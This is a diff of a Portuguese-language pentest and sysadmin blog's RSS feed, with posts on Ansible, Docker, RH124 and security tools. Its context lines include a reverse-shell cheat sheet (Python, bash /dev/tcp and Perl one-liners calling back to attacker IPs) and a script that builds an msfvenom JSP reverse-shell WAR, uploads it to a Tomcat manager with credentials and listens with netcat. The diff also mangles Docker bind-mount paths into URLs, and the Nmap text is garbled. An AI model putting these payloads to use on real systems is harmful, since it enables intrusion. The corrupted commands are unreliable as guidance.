@@ -1,19 +1,20 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
   <channel>
     <docs>https://blogs.law.harvard.edu/tech/rss</docs>
-    <title>FXSHELL</title>
-    <link>/posts/</link>
-    <description>Recent content on FXSHELL</description>
+    <title>FXShell - Writeups &amp; Segurança</title>
+    <link>https://fxshelll.github.io/posts/</link>
+    <description>Recent content on FXShell - Writeups &amp; Segurança</description>
     <ttl>1440</ttl>
     <generator>Hugo 0.123.7</generator>
-    <language>en-us</language>
-    <lastBuildDate>Fri, 16 May 2025 00:17:02 UT</lastBuildDate>
-    <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <language>pt-br</language>
+    <lastBuildDate>Fri, 16 May 2025 01:05:07 UT</lastBuildDate>
+    <atom:link href="https://fxshelll.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Uma Breve Historia no Tempo</title>
-      <link>/posts/uma_breve/</link>
+      <link>https://fxshelll.github.io/posts/uma_breve/</link>
       <pubDate>Sun, 21 Jan 2024 00:00:00 UT</pubDate>
-      <guid>/posts/uma_breve/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/uma_breve/</guid>
       <description>Às 23h00, mergulhamos em um momento singular, marcado não apenas pelo relógio, mas também pelas profundezas da percepção do tempo. A noite, com seu manto escuro, carrega consigo uma aura de reflexão e contemplação, convidando-nos a explorar as dimensões intrincadas do tempo que se desenrola diante de nós.
 A percepção do tempo, nesse instante, revela-se uma experiência complexa. O relógio avança ininterruptamente, marcando cada segundo com precisão implacável, enquanto nossa mente, em constante diálogo com a noite, tece uma teia de pensamentos que se entrelaçam com as horas que se dissipam.</description>
       <content:encoded><![CDATA[Às 23h00, mergulhamos em um momento singular, marcado não apenas pelo relógio, mas também pelas profundezas da percepção do tempo. A noite, com seu manto escuro, carrega consigo uma aura de reflexão e contemplação, convidando-nos a explorar as dimensões intrincadas do tempo que se desenrola diante de nós.
@@ -27,9 +28,10 @@ A percepção do tempo, à medida que o ponteiro avança para a meia-noite, pode
     </item>
     <item>
       <title>Ansible</title>
-      <link>/posts/ansible/</link>
+      <link>https://fxshelll.github.io/posts/ansible/</link>
       <pubDate>Tue, 30 Mar 2021 00:56:17 UT</pubDate>
-      <guid>/posts/ansible/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/ansible/</guid>
       <description>O ansible é uma forma de comunicação superluminica. Ou seja passar uma informação ao mesmo tempo para objetos.
 É uma ferramenta opensource que te possibilita realizar comunicação e interação com diversos destinos ao mesmo tempo, tudo de forma automatizada.
 - Gerenciamento de mudança - Provisionamento - Automação - Orquestração Gerenciamento de Mudança =&amp;gt; Idempotente Executa somente uma vez as alterações, se não houve alteração ele não executa.
@@ -123,9 +125,10 @@ ansible hostname -m setup Para separar um pouco mais as regras coloquei minhas v
     </item>
     <item>
       <title>Redhat RH124</title>
-      <link>/posts/redhat-rh124/</link>
+      <link>https://fxshelll.github.io/posts/redhat-rh124/</link>
       <pubDate>Wed, 17 Mar 2021 02:03:55 UT</pubDate>
-      <guid>/posts/redhat-rh124/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/redhat-rh124/</guid>
       <description>Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experiência anterior em administração de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobrevivência&amp;rdquo; de administração do Linux, com foco em tarefas centrais de administração. O Red Hat System Administration I também oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de nível corporativo.</description>
       <content:encoded><![CDATA[
 Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experiência anterior em administração de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &amp;ldquo;habilidades de sobrevivência&amp;rdquo; de administração do Linux, com foco em tarefas centrais de administração. O Red Hat System Administration I também oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de nível corporativo. Esses conceitos serão mais desenvolvidos no próximo curso, Red Hat System Administration II (RH134).
@@ -2019,9 +2022,10 @@ Ativar a interface de gerenciamento do console da web para gerenciar e monitorar
     </item>
     <item>
       <title>Proxychain</title>
-      <link>/posts/proxychain/</link>
+      <link>https://fxshelll.github.io/posts/proxychain/</link>
       <pubDate>Wed, 03 Feb 2021 14:49:14 UT</pubDate>
-      <guid>/posts/proxychain/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/proxychain/</guid>
       <description>O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
 Ao invés do Proxychains realizar o roteamento para uma lista específica de proxys, podemos usar o Tor Router e redirecionar as requisições diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.</description>
       <content:encoded><![CDATA[O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
@@ -2046,9 +2050,10 @@ Realizando uma varredura via Proxychains root@kali:~#: proxychains nmap -sC -sS 
     </item>
     <item>
       <title>Docker</title>
-      <link>/posts/docker/</link>
+      <link>https://fxshelll.github.io/posts/docker/</link>
       <pubDate>Thu, 08 Oct 2020 14:10:44 UT</pubDate>
-      <guid>/posts/docker/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/docker/</guid>
       <description>Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
 Quando falamos de container, estamos falando de isolamento. Esse container está sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que está rodando este container.</description>
       <content:encoded><![CDATA[Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
@@ -2129,11 +2134,11 @@ A principal função do volume é persistir os dados. Diferentemente do filesyst
 #Exemplo
 Criamos uma pasta para montar nosso volume no local:
 root@FXSHELL ~# mkdir /opt/moranguinho Volumes do tipo bind é quando eu já tenho um diretório que quero montar especifico.
-root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian Beleza, já dentro do container crio um arquivo de teste dentro do volume.
+root@FXSHELL ~# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho debian Beleza, já dentro do container crio um arquivo de teste dentro do volume.
 root@07b30662ffc0:/# cd moranguinho/ root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# touch teste root@07b30662ffc0:/moranguinho# exit exit root@FXSHELL ~# cd /opt/moranguinho/ root@FXSHELL /o/moranguinho# ls teste root@FXSHELL /o/moranguinho# Agora se eu executar um outro container, posso notar que o volume continua o mesmo e com o arquivo criado no passo anterior lá dentro.
-root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian root@c72d32bd0846:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@c72d32bd0846:/# cd moranguinho/ root@c72d32bd0846:/moranguinho# ls teste root@c72d32bd0846:/moranguinho# root@9911369c74af:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 217G 8.8G 197G 5% / tmpfs 64M 0 64M 0% /dev tmpfs 491M 0 491M 0% /sys/fs/cgroup shm 64M 0 64M 0% /dev/shm /dev/sda1 217G 8.8G 197G 5% /moranguinho tmpfs 491M 0 491M 0% /proc/asound tmpfs 491M 0 491M 0% /proc/acpi tmpfs 491M 0 491M 0% /proc/scsi tmpfs 491M 0 491M 0% /sys/firmware root@9911369c74af:/# Este é o volume do tipo bind
+root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho debian root@c72d32bd0846:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@c72d32bd0846:/# cd moranguinho/ root@c72d32bd0846:/moranguinho# ls teste root@c72d32bd0846:/moranguinho# root@9911369c74af:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 217G 8.8G 197G 5% / tmpfs 64M 0 64M 0% /dev tmpfs 491M 0 491M 0% /sys/fs/cgroup shm 64M 0 64M 0% /dev/shm /dev/sda1 217G 8.8G 197G 5% /moranguinho tmpfs 491M 0 491M 0% /proc/asound tmpfs 491M 0 491M 0% /proc/acpi tmpfs 491M 0 491M 0% /proc/scsi tmpfs 491M 0 491M 0% /sys/firmware root@9911369c74af:/# Este é o volume do tipo bind
 OBS: também posso definir o volume somente como leitura definindo o parametro ro.
-root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@e779e386475a:/# cd moranguinho/ root@e779e386475a:/moranguinho# ls teste teste2 root@e779e386475a:/moranguinho# touch teste3 touch: cannot touch &amp;#39;teste3&amp;#39;: Read-only file system root@e779e386475a:/moranguinho# Mostrando a mensagem como read-only.
+root@FXSHELL ~# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho,ro debian root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho,ro debian root@e779e386475a:/# cd moranguinho/ root@e779e386475a:/moranguinho# ls teste teste2 root@e779e386475a:/moranguinho# touch teste3 touch: cannot touch &amp;#39;teste3&amp;#39;: Read-only file system root@e779e386475a:/moranguinho# Mostrando a mensagem como read-only.
 #Docker volume
 Posso checar todos os volumes criados com o comando:
 root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME root@FXSHELL ~# docker volume create moranguinho moranguinho root@FXSHELL ~# ls snap/ tosko_dockerfile/ root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume inspect moranguinho [ { &amp;#34;CreatedAt&amp;#34;: &amp;#34;2021-01-19T20:55:40-05:00&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Labels&amp;#34;: {}, &amp;#34;Mountpoint&amp;#34;: &amp;#34;/var/lib/docker/volumes/moranguinho/_data&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;moranguinho&amp;#34;, &amp;#34;Options&amp;#34;: {}, &amp;#34;Scope&amp;#34;: &amp;#34;local&amp;#34; } ] root@FXSHELL ~# Tudo e qualquer volume no docker, vai estar dentro de &amp;ldquo;/var/lib/docker/volumes&amp;rdquo;
@@ -2158,9 +2163,9 @@ root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --volumes-fro
 root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 79e408793331 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 8 seconds ago Up 7 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 2c2161d46619 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 6 minutes ago Up 6 minutes 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 49eeb1ffb245 centos &amp;#34;/bin/bash&amp;#34; 10 minutes ago Created dbdados root@FXSHELL ~# Fazendo da forma nova e atualizada:
 root@FXSHELL ~# docker volume create dbdados dbdados root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 1fbdf3f70d206cebb44049c737e2d08359118df654bcf9481a5a46c99ab47ccc root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 368bc32d8ca3203dd8962ced0a6a4b999f56751462f121d3100c00169e43e4a8 root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 368bc32d8ca3 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 5 seconds ago Up 3 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 1fbdf3f70d20 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 16 seconds ago Up 14 seconds 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local dbdados root@FXSHELL ~# E assim os dados do postgreSQL estão la dentro:
 root@FXSHELL ~# cd /var/lib/docker/volumes/dbdados/_data root@FXSHELL /v/l/d/v/d/_data# ls base/ pg_multixact/ pg_stat_tmp/ pg_xlog/ server.key@ global/ pg_notify/ pg_subtrans/ postgresql.conf pg_clog/ pg_serial/ pg_tblspc/ postmaster.opts pg_hba.conf pg_snapshots/ pg_twophase/ postmaster.pid pg_ident.conf pg_stat/ PG_VERSION server.crt@ root@FXSHELL /v/l/d/v/d/_data# Supondo que quero fazer um backup deste cara, e encarrego outro container de fazer isso, posso fazer algo assim:
-root@FXSHELL ~# mkdir /opt/backup root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# docker container run -ti --mount type=volume,src=dbdados,dst=/data --mount type=bind,src=/opt/backup,dst=/backup debian tar -cvf /backup/bkp-banco.tar /data montando um volume do tipo bind dentro deste novo container e empacotando com o tar, o bkp.
+root@FXSHELL ~# mkdir /opt/backup root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# docker container run -ti --mount type=volume,src=dbdados,dst=/data --mount type=bind,src=https://fxshelll.github.io/opt/backup,dst=/backup debian tar -cvf /backup/bkp-banco.tar /data montando um volume do tipo bind dentro deste novo container e empacotando com o tar, o bkp.
 #EXEMPLO DE COMANDOS
-# docker container run -ti --mount type=bind,src=/volume,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume,ro ubuntu # docker volume create moranguinho # docker volume rm moranguinho # docker volume inspect moranguinho # docker volume prune # docker container run -d --mount type=volume,source=moranguinho,destination=/var/opa nginx # docker container create -v /data --name dbdados centos # docker run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -ti --volumes-from dbdados -v $(pwd):/backup debian tar -cvf /backup/backup.tar /data #Criando um dockerfile
+# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/volume,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=https://fxshelll.github.io/root/primeiro_container,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=https://fxshelll.github.io/root/primeiro_container,dst=/volume,ro ubuntu # docker volume create moranguinho # docker volume rm moranguinho # docker volume inspect moranguinho # docker volume prune # docker container run -d --mount type=volume,source=moranguinho,destination=/var/opa nginx # docker container create -v /data --name dbdados centos # docker run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -ti --volumes-from dbdados -v $(pwd):/backup debian tar -cvf /backup/backup.tar /data #Criando um dockerfile
 $ vim dockerfiles/1/Dockerfile
 FROM debian #qual imagem vou me basear RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean #executa oque vai fazer ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; #Variavel de ambiente para não ter dois apache rodando ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; #Variavel de ambiente de identificação do processo ENV APACHE_RUN_USER=&amp;#34;www.data&amp;#34; #Variavel de ambiente usuário responsável pelo apache ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; #Variavel de ambiente grupo responsável pelo apache ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; #onde vai salvar os logs do apache LABEL description=&amp;#34;Webserver&amp;#34; #faz uma descrição (qualquer chave=valor) LABEL version=&amp;#34;1.0.0&amp;#34; VOLUME /var/www/html #docker vai criar automaticamente esse volume EXPOSE 80 #com a flag -P irá pegar o expose qualquer porta = 80 Para criar o container eu faço um docker build.
 root@FXSHELL ~# docker build . ou root@FXSHELL ~# docker image build -t meu_apache:1.0 . #Exemplos de Dockerfiles
@@ -2263,17 +2268,19 @@ Docker Secrets! ]]></content:encoded>
     </item>
     <item>
       <title>Steghide</title>
-      <link>/posts/steghide/</link>
+      <link>https://fxshelll.github.io/posts/steghide/</link>
       <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
-      <guid>/posts/steghide/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/steghide/</guid>
       <description>$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg </description>
       <content:encoded><![CDATA[$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg ]]></content:encoded>
     </item>
     <item>
       <title>Wfuzz</title>
-      <link>/posts/wfuzz/</link>
+      <link>https://fxshelll.github.io/posts/wfuzz/</link>
       <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
-      <guid>/posts/wfuzz/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/wfuzz/</guid>
       <description>É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
 wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
 c colorir saída
@@ -2288,9 +2295,10 @@ hc ignorar erros
     </item>
     <item>
       <title>GoBuster</title>
-      <link>/posts/gobuster/</link>
+      <link>https://fxshelll.github.io/posts/gobuster/</link>
       <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
-      <guid>/posts/gobuster/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/gobuster/</guid>
       <description>GoBuster Primo do DIRB
 O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
 -fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &amp;lt;modo&amp;gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &amp;lt;threads&amp;gt; – número de encadeamentos a serem executados (padrão: 10). -u &amp;lt;url / domain&amp;gt; – URL completo (incluindo esquema) ou nome de domínio base.</description>
@@ -2304,9 +2312,10 @@ $ gobuster dir -u http://192.168.219.128:65535 -w /usr/share/dirb/wordlists/big.
     </item>
     <item>
       <title>Wordlist com Palavras do Site</title>
-      <link>/posts/wordlist/</link>
+      <link>https://fxshelll.github.io/posts/wordlist/</link>
       <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
-      <guid>/posts/wordlist/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/wordlist/</guid>
       <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
 Crie o arquivo brute.py Para executa-lo basta rodar o comando:
 $ python3 brute.py
@@ -2318,9 +2327,10 @@ import re import requests def open_ressources(file_path): return [item.replace(&
     </item>
     <item>
       <title>Dirsearch</title>
-      <link>/posts/dirsearch/</link>
+      <link>https://fxshelll.github.io/posts/dirsearch/</link>
       <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
-      <guid>/posts/dirsearch/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/dirsearch/</guid>
       <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
 O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
 Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
@@ -2340,9 +2350,10 @@ _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSu
     </item>
     <item>
       <title>sh_MSFvenom</title>
-      <link>/posts/sh_msfvenom/</link>
+      <link>https://fxshelll.github.io/posts/sh_msfvenom/</link>
       <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
-      <guid>/posts/sh_msfvenom/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/sh_msfvenom/</guid>
       <description>echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.</description>
       <content:encoded><![CDATA[echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Criação do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplicação #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&amp;#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
 http://10.10.10.194:8080/exploit.war/
@@ -2353,9 +2364,10 @@ $ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
     </item>
     <item>
       <title>The_silver_searcher</title>
-      <link>/posts/the_silver_searcher/</link>
+      <link>https://fxshelll.github.io/posts/the_silver_searcher/</link>
       <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
-      <guid>/posts/the_silver_searcher/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/the_silver_searcher/</guid>
       <description>AG ====== https://github.com/ggreer/the_silver_searcher
 Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
 apt-get install silversearcher-ag</description>
@@ -2366,9 +2378,10 @@ apt-get install silversearcher-ag
     </item>
     <item>
       <title>Netcat</title>
-      <link>/posts/netcat/</link>
+      <link>https://fxshelll.github.io/posts/netcat/</link>
       <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
-      <guid>/posts/netcat/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/netcat/</guid>
       <description>Netcat ================
 O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confiável de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração e exploração de rede rica em recursos, pois pode criar quase qualquer tipo de conexão que você precisa e possui vários recursos internos interessantes.</description>
       <content:encoded><![CDATA[Netcat ================
@@ -2384,9 +2397,10 @@ Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na
     </item>
     <item>
       <title>Reverse Shell</title>
-      <link>/posts/dicasdereverseshell/</link>
+      <link>https://fxshelll.github.io/posts/dicasdereverseshell/</link>
       <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
-      <guid>/posts/dicasdereverseshell/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/dicasdereverseshell/</guid>
       <description>Python =====================
 python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.15&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; Bash =====================
 bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
@@ -2407,9 +2421,10 @@ xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
     </item>
     <item>
       <title>Nikto</title>
-      <link>/posts/nikto/</link>
+      <link>https://fxshelll.github.io/posts/nikto/</link>
       <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
-      <guid>/posts/nikto/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/nikto/</guid>
       <description>NIKTO ================
 Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados Não é necessário fazer a instalação do mesmo pois ele é um script perl.
@@ -2428,9 +2443,10 @@ ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
     </item>
     <item>
       <title>Searchexploit</title>
-      <link>/posts/searchexploit/</link>
+      <link>https://fxshelll.github.io/posts/searchexploit/</link>
       <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
-      <guid>/posts/searchexploit/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/searchexploit/</guid>
       <description>SEARCHSPLOIT ================
 Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.</description>
       <content:encoded><![CDATA[SEARCHSPLOIT ================
@@ -2447,9 +2463,10 @@ $ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
     </item>
     <item>
       <title>NMAP</title>
-      <link>/posts/toolsforpentest/</link>
+      <link>https://fxshelll.github.io/posts/toolsforpentest/</link>
       <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
-      <guid>/posts/toolsforpentest/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/toolsforpentest/</guid>
       <description>NMAP ================
 O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.</description>
       <content:encoded><![CDATA[NMAP ================
